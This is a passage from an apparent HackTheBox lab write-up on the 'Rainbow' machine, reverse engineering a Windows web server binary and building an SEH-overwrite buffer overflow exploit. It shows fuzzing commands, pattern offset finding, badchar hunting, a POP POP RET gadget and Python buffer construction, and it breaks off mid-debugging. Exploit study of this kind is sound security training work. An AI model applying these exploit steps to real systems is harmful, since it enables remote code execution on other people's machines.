Exported Function */\n/* closesocket  3  Exported Function */\n/* WSACleanup  116  Exported Function */\n</code></pre><p></p> <p>The client function will need a closer examination, because this is where there appears to be actual substance to the application.</p> <p>On line 69, I see a zeroing of memory using <code>memset</code>.  This is followed by a <code>recv</code> of  0x1000 bytes, followed by a <code>closesocket</code>.  The <code>local_28</code> variable is passed to the call of <code>closesocket</code>, so it must be a socket handle for the client. Curiously, Lines 76-78 seem to iterate over the <code>recv</code>'d bytes like <code>(int x=0; x&lt;len(recvd); x=x+1)</code> like a for-range type iterator.  However what is strange is the comparison of the indexed value to the <code>local_28</code> client sock fdescriptor.  So we seem to be avoiding a buffer overflow by checking if we reached the fdescriptor at offset +5 of the iterator.  Basically looking ahead at the dword adjacent to the iterator. </p> <p></p> <p>This is where things get interesting, because if we do manage to match to local_28, then a short jump to label <code>LAB_004019cb</code> occurs.  This looks like a shift left operation.  Every iteration, the byte pointed at by <code>local_14[local_18+5]</code> is reassigned the byte pointed at by <code>local_14[local_18+6]</code>.  There is no initializer in the for range loop, here we seem to be finishing off the remainder of the initial for range loop started on line 76. </p> <p>Once the shift operation has finished, the dword pointed at by <code>local_14[4]</code> is decremented by 1.  Then <code>local_30</code> is incremented by 1.   Then a short jump back up to start an <code>accept</code>,  <code>recv</code> all over again (label <code>LAB_00401894</code>).</p> <p></p> <p>If for some reason we can get to the end of the iterator in the initial for range loop without ever matching <code>local_14[local_18 + 5]</code> to the client sock fdescriptor, we enter a whole other branch.</p> <p></p> <p>Real quick, the three short jump labels go to  1. increment local_30 +1 then go back to <code>accept</code>, <code>recv</code> 2. just go back to <code>accept</code>, <code>recv</code> 3. If we made it here, it is because there wasn't actually a client fdescriptor, all paths from here lead to WSACleanup (i.e., maybe lost connection).</p> <p>The first function on line 87 is a slightly recursive function.  More on that in a  second. The second function on line 89 is a check if a VirtualProcessor is available, if not then throw an error. The third function on line 91 is also a check if a VirtualProcessor is available, if not then terminate().</p> <p>So it appears that, if there is something important to do with the received buffer, as all other paths lead away from using the buffer, then it has to happen in the first function found on line 87.  Because after that between the five choices you have two functions that both terminate-equiv, two labels that get a new client recv, and a label that terminates.</p> <p>Lets examine the function on line 87.</p> <p></p> <p>I'm renaming this function <code>depth1</code></p> <p>The <code>_unfancy()</code> function just returns whatever was passed to it.  In this way passed parameters get assigned to function-local variables.</p> <p>The function call on line 18 is, for lack of a better term, obnoxious:</p> <p></p> <p>We can skip close analysis of the first four function calls.  The first one, has deep recursion and at the end of all the recursion is obtaining structs.  I can't help but feel like its setting up for calling an SEH chain.  The other three are freeing memory and returning pointers to memory.  </p> <p>The function of interest is the <code>beginthreadex</code> call on line 39,  it has a function as an argument.  If the application is going to do something interesting with the <code>recv</code> buffer, now is its chance, because the function calls on lines 43, 46, and 49 are either throw an error, or do garbage collection and return.  However with the preamble that leads up to it, it is most likely what calls the SEH chain.</p> <p>Well, and this is a major disappointment.</p> <p>I think that's exactly what it does.</p> <p></p> <p>The first function on line 21 creates a compressed pair (???) , an obvious C++ construct related to optimization of empty memory storage (when empty).</p> <p>The other function calls occurring between lines 21 and 31 are just using an alternate form of, turn arguments into local variables.  This time, from what I can tell, the parameters are those of the parent function's, as nothing was passed to this function.</p> <p>Ah, but the function on line 33 is something else entirely.</p> <p></p> <p>That looks an awful lot like a function pointer exec, save for the three argument being passed to it.  We can see that pointer-to-param1 is being cast as a pointer-to-code-pointer, and then getting called with three arguments.</p> <p>There is nothing left to analyze here at the moment.</p>"},{"location":"writeups/HackTheBox/Machines/Rainbow/#dynamic-analysis","title":"Dynamic analysis","text":"<p>Only way forward is to debug it live.  The following can help expedite managing the lifecycle of the binary and attaching windbg to it.  one of the challenges is that the application blocks while its running, and it has console output .  So it has to be started as a background process and output redirected to a file while trying to one-liner starting and attaching to it.</p> <p>Additionally I have set an initial breakpoint at the instruction that calls Ordinal_16 (recv). </p><pre><code>c:\\rainbow&gt;((cmd.exe /c \"taskkill /F /IM rainbow.exe\" &amp;&amp; timeout 3 &amp;&amp; START /B \"\" \"c:\\rainbow\\rainbow.exe\" &gt; c:\\users\\admin\\desktop\\current_thing\\output.txt) || START /B \"\" \"c:\\rainbow\\rainbow.exe\" &gt; c:\\users\\admin\\desktop\\current_thing\\output.txt) &amp;&amp; timeout 3 &amp;&amp; \"C:\\Program Files (x86)\\Windows Kits\\10\\Debuggers\\x86\\windbg.exe\" -WF C:\\windbg_custom.WEW -pn rainbow.exe -c 'bp 0x00401971; g'\n</code></pre><p></p> <p>In <code>IDAPro</code>, that would actually be here:</p> <p></p> <p>To cause the application to hit the breakpoint, I can start with an initial curl command, although this is just a hello world; this is about to become a PoC. </p><pre><code>\u250c\u2500\u2500(notroot\u327felysium)-[(master) 1 ~/htb/machines/rainbow/dump]\n\u2514\u2500$ perl -e \"printf 'A'x0x1020\" | curl -X POST http://192.168.56.100:8080/index.html -d \"fuzzed=$(cat -)\"\n</code></pre><p></p> <p>The convention for calling <code>ws2_32::recv</code></p> <p>https://learn.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-recv</p> <pre><code>int WSAAPI recv(\n  [in]  SOCKET s,\n  [out] char   *buf,\n  [in]  int    len,\n  [in]  int    flags\n);\n</code></pre> <p>That means at the breakpoint, the first four dwords on the stack are the arguments. </p><pre><code>Breakpoint 0 hit\neax=00000110 ebx=0022d000 ecx=00000018 edx=0019eca8 esi=0019ff24 edi=0019fdac\neip=00401971 esp=0019ec90 ebp=0019fe08 iopl=0         nv up ei pl nz ac pe nc\ncs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000216\nrainbow+0x1971:\n00401971 ff15ccb14000    call    dword ptr [rainbow+0xb1cc (0040b1cc)] ds:002b:0040b1cc={WS2_32!recv (774b23a0)}\n\n0:000&gt; dd esp L4\n0019ec90  00000110 0019eca8 00001000 00000000\n</code></pre><p></p> <p>The buffer will get received into <code>0019eca8</code>.  Stepping over the instruction, the <code>recv</code> buffer gets filled. </p><pre><code>0:000&gt; p\neax=00001000 ebx=0022d000 ecx=00000002 edx=0019ebf0 esi=0019ff24 edi=0019fdac\neip=00401977 esp=0019eca0 ebp=0019fe08 iopl=0         nv up ei pl zr na pe nc\ncs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246\nrainbow+0x1977:\n00401977 8945cc          mov     dword ptr [ebp-34h],eax ss:002b:0019fdd4=00000000\n0:000&gt; db 0x0019eca8 L4096\n0019eca8  50 4f 53 54 20 2f 69 6e-64 65 78 2e 68 74 6d 6c  POST /index.html\n0019ecb8  20 48 54 54 50 2f 31 2e-31 0d 0a 48 6f 73 74 3a   HTTP/1.1..Host:\n0019ecc8  20 31 39 32 2e 31 36 38-2e 35 36 2e 31 30 30 3a   192.168.56.100:\n0019ecd8  38 30 38 30 0d 0a 55 73-65 72 2d 41 67 65 6e 74  8080..User-Agent\n0019ece8  3a 20 63 75 72 6c 2f 38-2e 31 35 2e 30 0d 0a 41  : curl/8.15.0..A\n0019ecf8  63 63 65 70 74 3a 20 2a-2f 2a 0d 0a 43 6f 6e 74  ccept: */*..Cont\n0019ed08  65 6e 74 2d 4c 65 6e 67-74 68 3a 20 34 31 33 35  ent-Length: 4135\n0019ed18  0d 0a 43 6f 6e 74 65 6e-74 2d 54 79 70 65 3a 20  ..Content-Type: \n0019ed28  61 70 70 6c 69 63 61 74-69 6f 6e 2f 78 2d 77 77  application/x-ww\n0019ed38  77 2d 66 6f 72 6d 2d 75-72 6c 65 6e 63 6f 64 65  w-form-urlencode\n0019ed48  64 0d 0a 0d 0a 66 75 7a-7a 65 64 3d 41 41 41 41  d....fuzzed=AAAA\n0019ed58  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA\n0019ed68  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA\n[...]\n[...]\n0019fc98  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA\n0019fca8  01 00 00 00 10 01 00 00-10 01 00 00 00 00 00 00  ................\n</code></pre><p></p> <p>As can be seen, this pass was for some 0x1000 bytes.</p> <p>Passing over again, we see that the buffer was zeroed out, and the remaining 0x20 + len(http POST request minus data) bytes was received: </p><pre><code>0:000&gt; p\neax=000000cc ebx=0022d000 ecx=00000002 edx=0019ebf0 esi=0019ff24 edi=0019fdac\neip=00401977 esp=0019eca0 ebp=0019fe08 iopl=0         nv up ei pl zr na pe nc\ncs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246\nrainbow+0x1977:\n00401977 8945cc          mov     dword ptr [ebp-34h],eax \n0:000&gt; db 0x0019eca8 L100\n0019eca8  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA\n0019ecb8  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA\n0019ecc8  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA\n0019ecd8  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA\n0019ece8  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA\n0019ecf8  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA\n0019ed08  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA\n0019ed18  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA\n0019ed28  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA\n0019ed38  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA\n0019ed48  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA\n0019ed58  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA\n0019ed68  41 41 41 41 41 41 41 41-41 41 41 41 00 00 00 00  AAAAAAAAAAAA....\n0019ed78  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................\n</code></pre><p></p> <p>The maths </p><pre><code>\u250c\u2500\u2500(notroot\u327felysium)-[(master) 1 ~/htb/machines/rainbow/dump]\n\u2514\u2500$ echo 'ibase=16; obase=A; D64-C68' | bc\n252\n</code></pre><p></p> <p>The http post request added to the request has thrown off initial assumptions.</p> <p>One key discovery is that during testing, I found that the payload only makes it to the functionpointer exec if the connection is kept open.</p> <p>Additionally, I found that the sent data can be max 0x1000 bytes, anything over that resets the buffer (causes it to get zeroed back out and any modulo 0x1000 is received as the buffer)</p> <p>The following has two breakpoints, one at the call for recv, the other at the function call that contains the functionpointer exec.</p> <pre><code>((cmd.exe /c \"taskkill /F /IM rainbow.exe\" &amp;&amp; timeout 3 &amp;&amp; START /B \"\" \"c:\\rainbow\\rainbow.exe\" &gt; c:\\users\\admin\\desktop\\current_thing\\output.txt) || START /B \"\" \"c:\\rainbow\\rainbow.exe\" &gt; c:\\users\\admin\\desktop\\current_thing\\output.txt) &amp;&amp; timeout 3 &amp;&amp; \"C:\\Program Files (x86)\\Windows Kits\\10\\Debuggers\\x86\\windbg.exe\" -WF C:\\windbg_custom.WEW -pn rainbow.exe -c 'bp 0x00401971; bp 0x0040232f; g'\n</code></pre>"},{"location":"writeups/HackTheBox/Machines/Rainbow/#finding-a-crash","title":"Finding a crash","text":"<p>I found that if I debug without any breakpoints, and if I send a POST request with 0x1000 bytes, I get a response back. </p><pre><code>\u250c\u2500\u2500(notroot\u327felysium)-[(master) 2 ~/htb/machines/rainbow]\n\u2514\u2500$ perl -e \"printf 'A'x0x1000\" | curl -X POST http://192.168.56.100:8080/index.html -d \"fuzzed=$(cat -)\"\n&lt;html&gt;&lt;h1&gt;404 Not Found&lt;/h1&gt;&lt;/html&gt;\n</code></pre><p></p> <p>If I back that off just by 0x100 bytes, I get AccessViolation. </p><pre><code>\u250c\u2500\u2500(notroot\u327felysium)-[(master) 2 ~/htb/machines/rainbow]\n\u2514\u2500$ perl -e \"printf 'A'x0x0f00\" | curl -X POST http://192.168.56.100:8080/index.html -d \"fuzzed=$(cat -)\"\n</code></pre><p></p> <p></p> <p>The exception chain shows that it has been overwritten with As: </p><pre><code>0:003&gt; !exchain\n009bfbe4: 41414141\nInvalid exception stack at 41414141\n</code></pre><p></p> <p>Further, once converted to python,  I found that I can coerce this failure with a very minimal POST body, saving space and eliminating variability.</p> <p></p><pre><code>buf = \"POST / HTTP/1.1\\x0d\\x0aContent-Type: application/x-www-form-urlencoded\\x0d\\x0a\\x0d\\x0a\"\nbuf += (\"\\x41\" * 0xf00)\n</code></pre> ^^ 3908 bytes total<p></p>"},{"location":"writeups/HackTheBox/Machines/Rainbow/#finding-the-pattern","title":"Finding the pattern","text":"<p>Retesting with a pattern, with the following buffer.  I'll pass the pattern string in at CLI invocation. </p><pre><code>buf = \"POST / HTTP/1.1\\x0d\\x0aContent-Type: application/x-www-form-urlencoded\\x0d\\x0a\\x0d\\x0a\"\nbuf += sys.argv[2][:0xf00]\n</code></pre><p></p> <p>Called like: </p><pre><code>\u250c\u2500\u2500(notroot\u327felysium)-[(master) 2 ~/htb/machines/rainbow]\n\u2514\u2500$ ./poc.py 192.168.56.100:8080 $(msf-pattern_create -l 0x0f00)\n</code></pre><p></p> <p>Identify the pattern found in the exception stack: </p><pre><code>0:003&gt; !exchain\n009cfbe4: 77413177\nInvalid exception stack at 41307741\n</code></pre><p></p> <p>Identify the offset </p><pre><code>\u250c\u2500\u2500(notroot\u327felysium)-[(master) 2 ~/htb/machines/rainbow]\n\u2514\u2500$ msf-pattern_offset -l 0x0f00 -q 77413177\n[*] Exact match at offset 664\n</code></pre><p></p> <p>Buffer be like </p><pre><code>    total_len = 3908\n    crash_len = 664\n    head = \"POST / HTTP/1.1\\x0d\\x0aContent-Type: application/x-www-form-urlencoded\\x0d\\x0a\\x0d\\x0a\"\n    sled1 = (\"\\x40\" * crash_len)\n    SEH = (\"\\x41\" * 4)\n    tail = (\"\\x42\" * (total_len - sum([len(x) for x in [\n        head,\n        sled1,\n        SEH\n    ]])))\n    buf = f\"{head}{sled1}{SEH}{tail}\"\n</code></pre><p></p> <p>Now I am aligned </p><pre><code>0:003&gt; !exchain\n009dfbe4: 41414141\nInvalid exception stack at 40404040\n</code></pre><p></p>"},{"location":"writeups/HackTheBox/Machines/Rainbow/#finding-badchars","title":"Finding Badchars","text":"<p>Real quick though, test for badchars.  I have a function I built for that:</p> <pre><code>badchars = \"\"\ndef gen_badchars(bc, start=\"\\x01\", end=\"\\xff\"):\n    s_int = ord(start)\n    e_int = ord(end)+1\n    BC = bytearray(range(s_int,e_int)).decode('latin-1')\n    for item in bc:\n        BC = BC.replace(item,'')\n    return BC\n</code></pre> <p>I use the above function and variable for massaging out badchars, by creating a string containing all bytes within a certain range.  I typically just start out with null to -1 as the range, but sometime I'd know beforehand about certain badchars, in this case I have no clue. </p> <pre><code>    total_len = 3908\n    crash_len = 664\n    head = \"POST / HTTP/1.1\\x0d\\x0aContent-Type: application/x-www-form-urlencoded\\x0d\\x0a\\x0d\\x0a\"\n    sled1 = (\"\\x40\" * crash_len)\n    SEH = (\"\\x41\" * 4)\n    bad = gen_badchars(badchars, start=\"\\x00\", end=\"\\xff\")\n    tail = (\"\\x42\" * (total_len - sum([len(x) for x in [\n        head,\n        sled1,\n        SEH,\n        bad\n    ]])))\n    buf = f\"{head}{sled1}{SEH}{bad}{tail}\"\n</code></pre> <p>Null is for sure bad.  </p><pre><code>0:003&gt; !exchain\n009ff8e4: rainbow+a040 (0040a040)\n009ff924: rainbow+a040 (0040a040)\n009ffbe4: 41414141\nInvalid exception stack at 40404040\n0:003&gt; db 0x009ffbe4 L0n256\n009ffbe4  40 40 40 40 41 41 41 41-05 00 00 00 f0 fe 9f 00  @@@@AAAA........\n009ffbf4  b3 26 40 00 28 60 6d 00-b8 60 6d 00 b8 60 6d 00  .&amp;@.(`m..`m..`m\n</code></pre><p></p> <p>So I add <code>\\x00</code> to the badchars var above the <code>gen_badchars</code> function, rinse and repeat.</p> <p>This time I had to go hunting for it a little bit, alignment was thrown off. </p><pre><code>0:003&gt; db 0x00a0fbe4-0x2b0 L0n280\n00a0f934  a3 2b 40 00 50 f9 a0 00-b8 b3 40 00 b8 8c 62 00  .+@.P.....@...b.\n00a0f944  10 3d 61 00 c0 20 40 00-10 3d 61 00 0b 0c 0d 0e  .=a.. @..=a.....\n00a0f954  0f 10 11 12 13 14 15 16-17 18 19 1a 1b 1c 1d 1e  ................\n00a0f964  1f 20 21 22 23 24 25 26-27 28 29 2a 2b 2c 2d 2e  . !\"#$%&amp;'()*+,-.\n00a0f974  2f 30 31 32 33 34 35 36-37 38 39 3a 3b 3c 3d 3e  /0123456789:;&lt;=&gt;\n00a0f984  3f 40 41 42 43 44 45 46-47 48 49 4a 4b 4c 4d 4e  ?@ABCDEFGHIJKLMN\n00a0f994  4f 50 51 52 53 54 55 56-57 58 59 5a 5b 5c 5d 5e  OPQRSTUVWXYZ[\\]^\n00a0f9a4  5f 60 61 62 63 64 65 66-67 68 69 6a 6b 6c 6d 6e  _`abcdefghijklmn\n00a0f9b4  6f 70 71 72 73 74 75 76-77 78 79 7a 7b 7c 7d 7e  opqrstuvwxyz{|}~\n00a0f9c4  7f 80 81 82 83 84 85 86-87 88 89 8a 8b 8c 8d 8e  ................\n00a0f9d4  8f 90 91 92 93 94 95 96-97 98 99 9a 9b 9c 9d 9e  ................\n00a0f9e4  9f a0 a1 a2 a3 a4 a5 a6-a7 a8 a9 aa ab ac ad ae  ................\n00a0f9f4  af b0 b1 b2 b3 b4 b5 b6-b7 b8 b9 ba bb bc bd be  ................\n00a0fa04  bf c0 c1 c2 c3 c4 c5 c6-c7 c8 c9 ca cb cc cd ce  ................\n00a0fa14  cf d0 d1 d2 d3 d4 d5 d6-d7 d8 d9 da db dc dd de  ................\n00a0fa24  df e0 e1 e2 e3 e4 e5 e6-e7 e8 e9 ea eb ec ed ee  ................\n00a0fa34  ef f0 f1 f2 f3 f4 f5 f6-f7 f8 f9 fa fb fc fd fe  ................\n00a0fa44  ff 42 42 42 42 42 42 42                          .BBBBBBB\n</code></pre><p></p> <p>This is a hard one to decipher, because of the way the rest of the badchars came back afterwards, and they were found way out of alignment.  But I think <code>\\x0a</code> is a badchar.  So adding it.</p> <p>Yes, that was correct.  All is well now </p><pre><code>0:003&gt; !exchain\n00a1fbe4: 41414141\nInvalid exception stack at 40404040\n0:003&gt; db 0x00a1fbe4 L0x256\n00a1fbe4  40 40 40 40 41 41 41 41-01 02 03 04 05 06 07 08  @@@@AAAA........\n00a1fbf4  09 0b 0c 0d 0e 0f 10 11-12 13 14 15 16 17 18 19  ................\n00a1fc04  1a 1b 1c 1d 1e 1f 20 21-22 23 24 25 26 27 28 29  ...... !\"#$%&amp;'()\n00a1fc14  2a 2b 2c 2d 2e 2f 30 31-32 33 34 35 36 37 38 39  *+,-./0123456789\n00a1fc24  3a 3b 3c 3d 3e 3f 40 41-42 43 44 45 46 47 48 49  :;&lt;=&gt;?@ABCDEFGHI\n00a1fc34  4a 4b 4c 4d 4e 4f 50 51-52 53 54 55 56 57 58 59  JKLMNOPQRSTUVWXY\n00a1fc44  5a 5b 5c 5d 5e 5f 60 61-62 63 64 65 66 67 68 69  Z[\\]^_`abcdefghi\n00a1fc54  6a 6b 6c 6d 6e 6f 70 71-72 73 74 75 76 77 78 79  jklmnopqrstuvwxy\n00a1fc64  7a 7b 7c 7d 7e 7f 80 81-82 83 84 85 86 87 88 89  z{|}~...........\n00a1fc74  8a 8b 8c 8d 8e 8f 90 91-92 93 94 95 96 97 98 99  ................\n00a1fc84  9a 9b 9c 9d 9e 9f a0 a1-a2 a3 a4 a5 a6 a7 a8 a9  ................\n00a1fc94  aa ab ac ad ae af b0 b1-b2 b3 b4 b5 b6 b7 b8 b9  ................\n00a1fca4  ba bb bc bd be bf c0 c1-c2 c3 c4 c5 c6 c7 c8 c9  ................\n00a1fcb4  ca cb cc cd ce cf d0 d1-d2 d3 d4 d5 d6 d7 d8 d9  ................\n00a1fcc4  da db dc dd de df e0 e1-e2 e3 e4 e5 e6 e7 e8 e9  ................\n00a1fcd4  ea eb ec ed ee ef f0 f1-f2 f3 f4 f5 f6 f7 f8 f9  ................\n00a1fce4  fa fb fc fd fe ff 42 42-42 42 42 42 42 42 42 42  ......BBBBBBBBBB\n</code></pre><p></p> <p>Final badcchars: </p><pre><code>badchars = \"\\x00\\x0a\"\n</code></pre><p></p> <p>Nothing uses the variable beyond hunting for badchars.</p>"},{"location":"writeups/HackTheBox/Machines/Rainbow/#finding-poppopret","title":"Finding PopPopRet","text":"<p>Of note, only the rainbow binary will do.  Everything else has DEP and ASLR enabled, and, why fight them if you don't have to. </p><pre><code>0:003&gt; !load narly\n\n      __s|I}*!{a.                        ._s,aan2*a\n     _wY1+~-    )S,                     .ae\"~=:...:X\n   .vXl+:.       -4c                   &lt;2+=|==::..:d\n   vvi=;..        -?o,                =2=+==:::...=d\n  )nv=:.            )5,              .2=--.......-=d\n  ue+::              -*s             &lt;c .        .=d\n  m&gt;==::..     ._,     &lt;s,           )c           :d\n  #==viii|===; {Xs=,    -{s          )c         ..:d\n  Z;{nnonnvvii;v(-{%=.    ~s,        )e:====||iiv%=d\n  X={oooonvvIl;3;  -{%,    -*&gt;       )2&lt;onnnnvnnnn&gt;d\n  X=)vvvvIliii:3;    -!s.   :)s.     )e&lt;oonvlllllIid\n  X=&lt;lllliii|=:n;      -1c.  +|1,    )z&lt;nvii||+|+|vX\n  S=&lt;lli|||=:: n;        \"nc  -s%;   )c=ovl|++==+=vo\n  X=&lt;i||+=; . .n`          \"1&gt;.-{%i. )c&lt;Xnnli||++=vn\n  X=iii&gt;==-.  :o`            \"1,:+iI,)c:Sonnvli||=v(\n  X&gt;{ii+;:-  .u(               \"o,-{Iw(:nvvvllii=v2\n  S=i||;:. .=u(                 -!o,+I(:iiillii|ie`\n  2&gt;v|==__su?`                    -?o,-:==||iisv\"\n  {nvnI!\"\"~                         -!sasvv}\"\"`\n\n             by Nephi Johnson (d0c_s4vage)\n                      N for gnarly!\n\nAvailable commands:\n\n    !nmod     - display /SafeSEH, /GS, DEP, and ASLR info for\n                all loaded modules\n\n0:003&gt; !nmod\n00400000 00411000 rainbow              /SafeSEH OFF /GS            c:\\rainbow\\rainbow.exe\n6f980000 6f995000 VCRUNTIME140         /SafeSEH ON  /GS *ASLR *DEP C:\\Windows\\SYSTEM32\\VCRUNTIME140.dll\n6f9a0000 6fa0d000 MSVCP140             /SafeSEH ON  /GS *ASLR *DEP C:\\Windows\\SYSTEM32\\MSVCP140.dll\n74e80000 74e8f000 kernel_appcore       /SafeSEH ON  /GS *ASLR *DEP C:\\Windows\\SysWOW64\\kernel.appcore.dll\n74fc0000 75012000 mswsock              /SafeSEH ON  /GS *ASLR *DEP C:\\Windows\\system32\\mswsock.dll\n753c0000 7547f000 msvcrt               /SafeSEH ON  /GS *ASLR *DEP C:\\Windows\\SysWOW64\\msvcrt.dll\n75f30000 75fe9000 RPCRT4               /SafeSEH ON  /GS *ASLR *DEP C:\\Windows\\System32\\RPCRT4.dll\n76b10000 76d49000 KERNELBASE           /SafeSEH ON  /GS *ASLR *DEP C:\\Windows\\System32\\KERNELBASE.dll\n76f00000 77020000 ucrtbase             /SafeSEH ON  /GS *ASLR *DEP C:\\Windows\\System32\\ucrtbase.dll\n77050000 77140000 KERNEL32             /SafeSEH ON  /GS *ASLR *DEP C:\\Windows\\System32\\KERNEL32.DLL\n774a0000 77503000 WS2_32               /SafeSEH ON  /GS *ASLR *DEP C:\\Windows\\System32\\WS2_32.dll\n77550000 776f4000 ntdll                /SafeSEH ON  /GS *ASLR *DEP C:\\Windows\\SYSTEM32\\ntdll.dll\n\n*DEP/*ASLR means that these modules are compatible with ASLR/DEP\n</code></pre><p></p> <p>Well with null byte being a bad character, and given the address space of the binary, that means the boundary for the buffer has to end after the third byte of SEH in order to get the address placed on the stack correctly, because the last byte of the address is always null.   The end of the string (zero-terminated) will have to be what places the null byte for the fourth and final byte.</p> <p>Gadget hunt with a tool I built, that wraps around rp++. </p> <p>https://github.com/SYANiDE-/rp-ng</p> <pre><code>\u250c\u2500\u2500(notroot\u327felysium)-[(master) 1 ~/htb/machines/rainbow]\n\u2514\u2500$ rp++-ng --va 0x00400000 --file dump/rainbow.exe -r 3 --regex \"pop.*pop.*ret\" 2&gt;/dev/null\n\n  rp++-ng?                           ^^           \n            _________ _________      ___ __  __________ `\n   .       |    _o___|    _o___ ++- |   \\  |/   /_____/  !\n          |___|\\____|___|%%%%%     |____\\_|\\___\\____.] \n  z        `BB' `BBB'`B'           `BBBBBBB' `BBBBBBBB' \n     ;                                    Chain faster\n              [[                            $$$$$ $$$$$$      i\n                    +                                    SYANiDE\n\n\n0x4092ad: pop ecx ; pop ebp ; ret ; \n0x4094d8: pop ecx ; pop ecx ; ret ; \n0x409adc: pop edi ; pop esi ; pop ebx ; ret ; \n0x409b08: pop edi ; pop esi ; pop ebx ; ret ; \n0x4091b7: pop edi ; pop esi ; ret ; \n0x409add: pop esi ; pop ebx ; ret ; \n0x409b09: pop esi ; pop ebx ; ret ; \n</code></pre> <p>probably this one </p><pre><code>0x4094d8: pop ecx ; pop ecx ; ret ; \n</code></pre><p></p> <p>Removing the tail simplifies the buffer </p><pre><code>    total_len = 3908\n    crash_len = 664\n    head = \"POST / HTTP/1.1\\x0d\\x0aContent-Type: application/x-www-form-urlencoded\\x0d\\x0a\\x0d\\x0a\"\n    sled1 = (\"\\x40\" * crash_len)\n    SEH = \"\\xd8\\x94\\x40\"  ## 0x4094d8: pop ecx ; pop ecx ; ret ; \n    buf = f\"{head}{sled1}{SEH}\"\n</code></pre><p></p> <p>New breakpoint; break on pop pop ret. </p><pre><code>((cmd.exe /c \"taskkill /F /IM rainbow.exe\" &amp;&amp; timeout 3 &amp;&amp; START /B \"\" \"c:\\rainbow\\rainbow.exe\" &gt; c:\\users\\admin\\desktop\\current_thing\\output.txt) || START /B \"\" \"c:\\rainbow\\rainbow.exe\" &gt; c:\\users\\admin\\desktop\\current_thing\\output.txt) &amp;&amp; timeout 3 &amp;&amp; \"C:\\Program Files (x86)\\Windows Kits\\10\\Debuggers\\x86\\windbg.exe\" -WF C:\\windbg_custom.WEW -pn rainbow.exe -c 'bp 0x4094d8; g'\n</code></pre><p></p> <p>Crash </p><pre><code>0:003&gt; !exchain\n009ff8e4: rainbow+a040 (0040a040)\n009ff924: rainbow+a040 (0040a040)\n009ffbe4: rainbow+94d8 (004094d8)\nInvalid exception stack at 40404040\n0:003&gt; t\nBreakpoint 0 hit\neax=00000000 ebx=00000000 ecx=004094d8 edx=775d9280 esi=00000000 edi=00000000\neip=004094d8 esp=009ff310 ebp=009ff330 iopl=0         nv up ei pl zr na pe nc\ncs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246\nrainbow+0x94d8:\n004094d8 59              pop     ecx\n0:003&gt; t\neax=00000000 ebx=00000000 ecx=775d9262 edx=775d9280 esi=00000000 edi=00000000\neip=004094d9 esp=009ff314 ebp=009ff330 iopl=0         nv up ei pl zr na pe nc\ncs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246\nrainbow+0x94d9:\n004094d9 59              pop     ecx\n0:003&gt; t\neax=00000000 ebx=00000000 ecx=009ff414 edx=775d9280 esi=00000000 edi=00000000\neip=004094da esp=009ff318 ebp=009ff330 iopl=0         nv up ei pl zr na pe nc\ncs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246\nrainbow+0x94da:\n004094da c3              ret\n0:003&gt; dd esp L1\n009ff318  009ffbe4\n0:003&gt; dd 0x009ffbe4 L10\n009ffbe4  40404040 004094d8 00000005 009ffef0\n009ffbf4  004026b3 00546058 005460e8 005460e8\n009ffc04  009ffe74 0019eca8 0040b5a0 005460a8\n009ffc14  00000000 00000000 0040b55c 005464d0\n</code></pre><p></p> <p>Very nice, ret will return to the 0x40404040.  </p>"},{"location":"writeups/HackTheBox/Machines/Rainbow/#to-seh-or-nseh-that-is-the-question","title":"To SEH or nSEH, that is the question","text":"<p>Not much of a question</p> <p>Need a small kickback, maybe 0x8 bytes. </p><pre><code>nasm &gt; jmp short 0xf8\n00000000  EBF6              jmp short 0xfffffff8\n</code></pre><p></p> <pre><code>    total_len = 3908\n    crash_len = 664-4\n    head = \"POST / HTTP/1.1\\x0d\\x0aContent-Type: application/x-www-form-urlencoded\\x0d\\x0a\\x0d\\x0a\"\n    sled1 = (\"\\x40\" * crash_len)\n    nSEH = \"\\x90\\x90\\xeb\\xf0\"  ## nasm &gt; jmp short 0xf2 / EBF0 jmp short 0xfffffff2\n    SEH = \"\\xd8\\x94\\x40\"  ## 0x4094d8: pop ecx ; pop ecx ; ret ; \n    buf = f\"{head}{sled1}{nSEH}{SEH}\"\n</code></pre> <p>Very nice... three dwords worth of space after the short jump. </p><pre><code>0:003&gt; dd eip\n00a0fbd8  40404040 40404040 40404040 f0eb9090\n</code></pre><p></p> <p>At this time, the beginning of the usable range is about 648 bytes back </p><pre><code>0:003&gt; dd eip-0n648\n00a0f950  40404040 40404040 40404040 40404040\n00a0f960  40404040 40404040 40404040 40404040\n</code></pre><p></p> <p>registers </p><pre><code>0:003&gt; r\neax=00000000 ebx=00000000 ecx=00a0f414 edx=775d9280 esi=00000000 edi=00000000\neip=00a0fbd8 esp=00a0f31c ebp=00a0f330 iopl=0         nv up ei pl zr na pe nc\ncs=0023  ss=002b  